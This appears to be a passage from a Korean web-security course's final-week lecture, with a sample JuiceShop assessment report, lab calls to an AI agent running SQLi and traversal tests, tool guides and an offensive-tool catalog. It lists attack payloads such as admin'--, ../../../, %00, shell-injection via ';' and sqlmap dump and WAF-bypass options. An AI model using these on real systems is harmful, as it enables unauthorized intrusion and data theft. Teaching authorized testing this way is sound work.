+  심각도: Critical (CVSS 9.8)
+  CWE: CWE-89
+  위치: POST /rest/user/login (email)
+  권고: Parameterized Query 또는 ORM 사용
+
+[V-002] XSS (검색 반사형)
+  심각도: High (CVSS 7.1)
+  CWE: CWE-79
+  위치: GET /rest/products/search (q)
+  권고: 출력 인코딩, CSP 헤더
+
+[V-003] API 접근제어 부재
+  심각도: Medium (CVSS 5.3)
+  CWE: CWE-284
+  위치: GET /api/Users
+  권고: JWT 인증 필수화
+
+[V-004] 약한 패스워드 정책
+  심각도: Medium (CVSS 5.3)
+  CWE: CWE-521
+  위치: POST /api/Users
+  권고: 최소 8자, 복잡도 요구
+
+[V-005] 보안 헤더 누락
+  심각도: Medium (CVSS 4.3)
+  CWE: CWE-693
+  위치: 전체 응답
+  권고: CSP, X-Frame-Options 등 헤더 추가
+
+[V-006] 계정 잠금 부재
+  심각도: Medium (CVSS 5.3)
+  CWE: CWE-307
+  위치: POST /rest/user/login
+  권고: 5회 실패 시 잠금 또는 CAPTCHA
+
+[V-007] package.json 노출
+  심각도: Low (CVSS 3.1)
+  CWE: CWE-200
+  위치: GET /package.json
+  권고: 정적 파일 접근 제한
+
+3. 권고사항 우선순위
+   [즉시] V-001 SQL Injection 수정
+   [즉시] V-002 XSS 출력 인코딩
+   [단기] V-003 API 인증 강화
+   [단기] V-004 패스워드 정책
+   [단기] V-006 계정 잠금 정책
+   [일반] V-005 보안 헤더
+   [일반] V-007 파일 노출 차단
+======================================================================
+```
+
+> **해석 — 기말 보고서 = 모든 주차 학습 결과 통합**:
+> - **7 발견 / Critical 1 + High 1 + Medium 4 + Low 1** = 평균 CVSS 5.7 (High 등급).
+> - **OWASP 분포**: A03 (Injection × 2 — V-001, V-002), A05 (Misconfig × 2 — V-005, V-007), A07 (Auth × 2 — V-004, V-006), A01 (Access × 1 — V-003).
+> - **CWE 분포**: 89, 79, 284, 521, 693, 307, 200 = 7 분류 모두 다른 = 광범위.
+> - **Top 3 권고**: SQLi 즉시 수정 + XSS 출력 인코딩 + API 인증 강화 = 가장 효과적 3 조치.
+> - **본 보고서 = 14주 학습의 결과**:
+>   - week03 정보수집 → V-005, V-007
+>   - week04 인증 → V-004, V-006
+>   - week05 SQLi → V-001
+>   - week06 XSS → V-002
+>   - week09 접근제어 → V-003
+> - **deliverable**: `/tmp/vuln_report.txt` + `pandoc -o report.pdf` + sha256 + GPG 서명 (week14 학습) → 클라이언트 제출.
+
+---
+
+## 6. Bastion 연동 실습
+
+### 6.1 Bastion로 점검 자동화
+
+Bastion Manager API를 호출하여 작업을 수행합니다.
+
+```bash
+export BASTION_API_KEY=ccc-api-key-2026            # 환경 변수 설정
+
+# 1. 프로젝트 생성
+echo "=== Bastion 프로젝트 생성 ==="
+curl -s -X POST http://10.20.30.200:8003/ask \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "message": "http://10.20.30.80:3000 JuiceShop 전체 대상 종합 웹취약점 점검: (1) 보안 헤더 수집, (2) 로그인 API에 SQLi 시도, (3) /api/Users IDOR, (4) /ftp 경로 순회, (5) JWT 디코드해서 발견사항을 CVSS v3.1 점수와 함께 표로 정리해줘."
+  }' \
+  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['answer'])"
+
+# 작업 기록 조회
+curl -s "http://10.20.30.200:8003/evidence?limit=20" | python3 -c "
+import sys, json
+for e in json.load(sys.stdin)[:20]:
+    msg = e.get('user_message','')[:60]
+    ok = '✓' if e.get('success') else '✗'
+    print(f'  {ok} {msg}')
+"
+```
+
+### 6.2 Bastion로 보고서 초안 자동 생성
+
+```bash
+curl -s -X POST http://10.20.30.200:8003/ask \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "message": "최근 20건의 /evidence를 분석해서 CVSS v3.1 점수·CWE·재현단계·권고사항을 포함한 모의해킹 보고서 초안을 한국어 markdown으로 작성해줘. 섹션: Executive Summary / Test Overview / Findings / Recommendations."
+  }' \
+  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['answer'])" > /tmp/draft_report.md
+
+wc -l /tmp/draft_report.md
+# 초안은 참고용 — hallucination 점검 후 수동 보강
+```
+
+---
+
+## 7. 과목 총정리
+
+### 7.1 15주 학습 맵
+
+```
+Week 01-02: 기초         -> 점검 개론, 도구 환경 구축
+Week 03-04: 정보수집/인증 -> 디렉토리 스캔, 세션 관리
+Week 05-07: 입력값 검증   -> SQLi, XSS, CSRF, 파일 업로드
+Week 08:    중간고사      -> JuiceShop 점검 보고서
+Week 09-12: 고급 점검     -> 접근제어, 암호화, 에러, API
+Week 13-14: 도구/보고서   -> 자동화 도구, CVSS, 보고서
+Week 15:    기말          -> 종합 점검 프로젝트
+```
+
+### 7.2 핵심 역량 자가 진단
+
+| 역량 | 확인 |
+|------|------|
+| 대상 시스템의 기술 스택을 식별할 수 있는가? | |
+| 블라인드 SQLi를 포함한 다양한 SQLi를 점검할 수 있는가? | |
+| 반사형/저장형/DOM XSS를 구분하고 점검할 수 있는가? | |
+| IDOR, 수직/수평 권한 상승을 점검할 수 있는가? | |
+| REST API 인증/인가를 체계적으로 점검할 수 있는가? | |
+| 점검 스크립트를 작성하고 결과를 분석할 수 있는가? | |
+| CVSS 기반 전문 보고서를 작성할 수 있는가? | |
+
+---
+
+## 제출물
+1. 취약점 점검 보고서 (PDF 또는 Markdown)
+2. Bastion 프로젝트 ID (evidence 자동 확인용)
+3. 재현 스크립트 (모든 취약점 재현 가능)
+
+---
+
+## 핵심 정리
+
+1. 웹취약점 점검은 계획-수집-점검-보고의 체계적 사이클이다
+2. OWASP Testing Guide는 산업 표준 점검 방법론이다
+3. 자동 도구와 수동 점검을 조합하면 최적의 결과를 얻는다
+4. 보고서는 재현성, 영향 분석, 구체적 권고사항이 핵심이다
+5. 점검은 반드시 승인된 범위 내에서 윤리적으로 수행한다
+
+## 다음 학기 예고
+보안시스템 운영 (Course 2) 또는 보안관제 (Course 5) 수강 권장
+
+---
+
+> **실습 환경 검증 완료** (2026-03-28): nmap/nikto, SQLi/IDOR/swagger.json, CVSS, 보고서 작성
+
+---
+
+## 📂 실습 참조 파일 가이드
+
+> 이번 주 실습에서 **실제로 조작하는** 솔루션의 기능·경로·파일·설정·UI 요점입니다.
+
+### 보고서 도구 (CVSS 계산기·Markdown·ReportLab)
+> **역할:** 취약점 보고서 표준화  
+> **실행 위치:** `작업 PC`  
+> **접속/호출:** FIRST CVSS 계산기 https://www.first.org/cvss/calculator/3.1
+
+**주요 경로·파일**
+
+| 경로 | 역할 |
+|------|------|
+| `reports/<project>/` | 재현 스크린샷·증적 저장 |
+| `template.md / template.docx` | 표준 템플릿 |
+
+**핵심 설정·키**
+
+- `CVSS 3.1 벡터 예: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — Critical 9.8
+- `CWE ID + 권고 (remediation)` — 보고서 필수 항목
+
+**UI / CLI 요점**
+
+- MermaidJS 공격 흐름도 — 교안/보고서 공통 도식
+- Pandoc `md → docx/pdf` — 포맷 변환
+
+> **해석 팁.** 보고서 가치는 **재현 절차의 완결성**에 달려 있다. 스크린샷·요청/응답 전체·시간 기록을 포함해야 고객이 독립 검증 가능.
+
+### OWASP ZAP
+> **역할:** 오픈소스 자동 웹 취약점 스캐너·프록시  
+> **실행 위치:** `작업 PC / Docker`  
+> **접속/호출:** GUI `zaproxy`, API `http://zap:8090/JSON/...`, Docker `owasp/zap2docker-stable`
+
+**주요 경로·파일**
+
+| 경로 | 역할 |
+|------|------|
+| `~/.ZAP/session-*` | 세션 저장소 |
+| `context.xml` | 스캔 컨텍스트(범위/인증) |
+
+**핵심 설정·키**
+
+- `Active Scan policy` — 룰별 강도 및 활성화 여부
+- `Authentication: form-based` — 로그인이 필요한 페이지 스캔
+
+**로그·확인 명령**
+
+- `~/.ZAP/zap.log` — 스캐너 실행 로그
+
+**UI / CLI 요점**
+
+- Spider — 링크 탐색 크롤링
+- Active Scan — 실제 페이로드 주입 점검
+- Report → Generate HTML report — 표준 보고서 출력
+
+> **해석 팁.** 인증 필요 페이지는 **Context에 로그인 폼**을 등록하지 않으면 로그아웃 상태로 스캔되어 커버리지가 급감. `zap-baseline.py`는 수동 확인용 경량 모드.
+
+### Burp Suite Community
+> **역할:** 웹 프록시 기반 수동/반자동 취약점 점검 도구  
+> **실행 위치:** `작업 PC → web (10.20.30.80:3000)`  
+> **접속/호출:** GUI `burpsuite`, CA 인증서 신뢰 필요 (`http://burp`)
+
+**주요 경로·파일**
+
+| 경로 | 역할 |
+|------|------|
+| `Proxy → HTTP history` | 모든 캡처된 요청/응답 |
+| `Intruder` | 페이로드 페이즈·위치 기반 자동화 |
+| `Repeater` | 단건 요청 수동 반복 |
+
+**핵심 설정·키**
+
+- `Proxy listener 127.0.0.1:8080` — 브라우저 프록시 포트
+- `Target → Scope` — in-scope 호스트만 처리
+
+**로그·확인 명령**
+
+- `Logger` — 세션 전체 요청 타임라인
+
+**UI / CLI 요점**
+
+- Ctrl+R — 요청을 Repeater로 전송
+- Ctrl+I — Intruder로 전송 후 위치(§) 설정
+- Intruder Attack type: Sniper/Cluster bomb — 단일/다중 페이로드 조합
+
+> **해석 팁.** Community 버전은 **Intruder 속도 제한**이 있어 대량 브루트포스는 비현실적. 취약점 재현과 보고서 증적 확보에 집중.
+
+---
+
+## 실제 사례 (WitFoo Precinct 6 — 학생 종합 점검 시 인용 가능한 baseline 묶음)
+
+> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
+> 본 lecture *기말 — 종합 웹취약점 점검 프로젝트* 학습 항목 (전 주차 통합·실제 운영환경 비교) 와 매핑되는 dataset 의 *전 주차에서 인용한 record summary*.
+
+### Case 1: 본 과목 전 주차 record 인용 표 (final report 부록 양식)
+
+| 본 과목 주차 | 인용 record / 통계 | dataset 출처 |
+|------------|-------------------|--------------|
+| w01 점검 개론 | WAF GET 1줄 (CEF format) | signals.parquet (GET, 4018건) |
+| w02 도구 환경 | GoogleImageProxy 4018건 단일 src burst | signals.parquet (src=100.64.1.37) |
+| w03 정보수집 | 100.64.20.230 — 1초 30 host × 54 port scan | signals.parquet (firewall_action) |
+| w04 인증/세션 | USER-0022 6,190 logon 통계 | signals.parquet (4624/4776) |
+| w05 SQLi | WAF POST JSESSIONID 평문 노출 | signals.parquet (POST 88건) |
+| w06 XSS/CSRF | email_protection block phishingScore=100 | signals.parquet (email_protection_event) |
+| w07 파일 업로드 | 4656/4658/4663/4690 분포 (24만건) | signals.parquet (Windows file audit) |
+| w08 중간고사 | incident `e5578610` 의 host node + framework 매핑 | incidents.jsonl |
+| w09 접근제어 | 5156 Filtering Connection (176K) + 5140 share access | signals.parquet (Windows WFP) |
+| w10 암호화 | WAF `app=TLSv1.3` + 5061 Crypto operation | signals.parquet |
+| w11 에러 처리 | HTTP 4xx (403·404·410·412·413·431·510) 총 2,827건 | signals.parquet |
+| w12 API 보안 | AWS Describe* read-only 150K + AssumeRole 9,340 | signals.parquet |
+| w13 자동화 도구 | 100.64.20.230 burst 재인용 (다른 관점) | signals.parquet |
+| w14 보고서 작성 | 전체 dataset 메타 (2.07M signals, 595K edges, 4-layer 익명화) | metadata.json |
+
+### Case 2: 종합 점검 보고서가 *연결해야 할* incident 1건
+
+dataset 의 `e5578610-d2eb-11ee-...` incident 가 보유한 *동시 다층 정보*:
+- HOST 노드: ip / hostname / org / managed flag / suspicion_score
+- 다중 vendor product: WitFoo Precinct + Cisco ASA Firewall (각각 framework 매핑 보유)
+- 노드 role: "Exploiting Target" + "Exploiting Host" *동시*
+- 시간 partition: `e562f7c0-d2eb-11ee-...` (재현 키)
+
+**해석 — 본 lecture (기말) 와의 매핑**
+
+| 종합 점검 학습 항목 | 본 dataset 의 시사점 |
+|--------------------|---------------------|
+| **다 주차 통합** | 학생 보고서가 전 14주의 발견을 *연결* — 본 dataset 처럼 *signal 단위* + *incident 그래프* + *framework 매핑* 3 layer 동시 보유 권장 |
+| **실제 vs 점검 환경 비교** | 본 dataset 은 *실제 운영* (WitFoo 고객 익명화). 학생 점검 결과를 *동등 layer* 비교 — *어느 부분이 학습 환경 한계* 인지 명시 |
+| **재현성** | partition + node id + edge id 까지 명시 → 기말 보고서도 동일 수준 재현 메타 첨부 |
+| **공개 가능성** | 본 dataset 이 *Apache 2.0 라이선스* 로 공개됨 — 기말 우수작 일부도 *동등 익명화 후 공개* 권장 (다음 코호트 reference) |
+
+**기말 평가 함의**: 본 dataset 의 다층 구조 (signal · graph · framework) 와 4-layer 익명화 를 *모방한 보고서* 가 가장 높은 점수.
+
+
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (lab week15 — 종합 웹 해킹)
+
+| step | 카테고리 | 핵심 도구 |
+|---|---|---|
+| 1 nmap 정찰 | **nmap -sV -sC -A** / **rustscan** / masscan / naabu |
+| 2 fingerprint | whatweb / **httpx** / wappalyzer / nmap -sV |
+| 3 SQLi 인증 | `admin'--` / sqlmap --level=5 / Burp Intruder |
+| 4 Command Injection | **commix** / DVWA / curl `;` |
+| 5 UNION SELECT | sqlmap --technique=U / 수동 / **DBeaver** |
+| 6 Null Byte / Traversal | %00 / ../../../ / **dotdotpwn** / wfuzz |
+| 7 sqlmap 자동 | --batch --dbs --tables --dump / **ghauri** / wapiti |
+| 8 chain | SQLi→BOLA→RCE / **BloodHound** / **CrackMapExec** / **PEASS-ng** |
+| 9 WAF 우회 | wafw00f / sqlmap --tamper / xsstrike --waf-evasion / Bypass-WAF Burp |
+| 10 보고서 | **OWASP Top 10 매트릭스** / **Kill Chain** / DefectDojo / **PTES** / CVSS / sha256 |
+
+### 학생 환경 준비
+```bash
+sudo apt install -y nmap rustscan masscan dotdotpwn-go crackmapexec
+go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
+git clone --depth 1 https://github.com/BloodHoundAD/BloodHound ~/BloodHound
+git clone --depth 1 https://github.com/peass-ng/PEASS-ng ~/PEASS-ng
+# DefectDojo: docker compose -f docker-compose.yml up -d
+```
+
+---
+
+## 종합: web-vuln-nonai 15 주차 OSS 도구 카탈로그
+
+전 주차에서 학생이 실습한 OSS 도구 (대분류):
+- **정찰**: nmap, rustscan, masscan, naabu, whatweb, httpx, wappalyzer, nikto, gobuster, ffuf, dirb
+- **TLS/headers**: openssl, sslscan, testssl.sh, Mozilla Observatory, Google CSP Evaluator
+- **WAF**: wafw00f, ModSecurity CRS, CORScanner, Corsy
+- **Injection**: sqlmap, ghauri, wapiti, bbqsql, sqlninja, commix
+- **Client-side**: XSStrike, dalfox, BeEF, XSS Hunter, Gophish
+- **File**: weevely, p0wny-shell, b374k, evilarc, exiftool, steghide
+- **Crypto**: hashid, hashcat, john, jwt_tool, pyjwt, ysoserial
+- **SSRF/XXE/CSRF**: SSRFmap, gopherus, XXEinjector, interactsh, rbndr.us, Singularity, csrfgenerator
+- **API**: kiterunner, arjun, gau, httpx, k6, autorize
+- **Auth/Session**: hydra, ffuf, wfuzz, patator, Burp Sequencer, ent
+- **MITM**: Wireshark, tshark, bettercap, Ferret, Hamster
+- **Static analysis**: bandit, semgrep, sqlfluff, eslint-plugin-security, RetireJS
+- **Defense lib**: DOMPurify, bleach, OWASP Java Encoder, Trusted Types, python-magic, ClamAV, Argon2id, WebAuthn/FIDO2
+- **Auto / CI/CD**: nuclei, OWASP ZAP, Burp Suite, Playwright, GitHub Actions
+- **Monitor**: Wazuh FIM, auditd, inotifywait, ModSecurity, Falco, VirusTotal API
+- **Cloud / Lateral**: Pacu, CloudGoat, BloodHound, CrackMapExec, kubectl, K8s NetworkPolicy, Cilium, Squid
+- **보고**: DefectDojo, sha256, asciinema, PTES, OWASP Top 10, Kill Chain
